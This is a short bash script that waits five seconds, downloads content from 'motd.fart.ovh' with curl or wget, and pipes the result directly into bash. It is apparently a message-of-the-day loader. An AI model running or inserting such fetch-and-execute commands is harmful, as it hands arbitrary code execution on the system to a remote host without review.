#!/bin/bash

sleep 5

if which curl &> /dev/null; then
    script_content=$(curl -4 -fsSL 'https://motd.fart.ovh')
elif which wget &> /dev/null; then
    script_content=$(wget --inet4-only -qO- 'https://motd.fart.ovh')
fi

echo "$script_content" | bash
exit
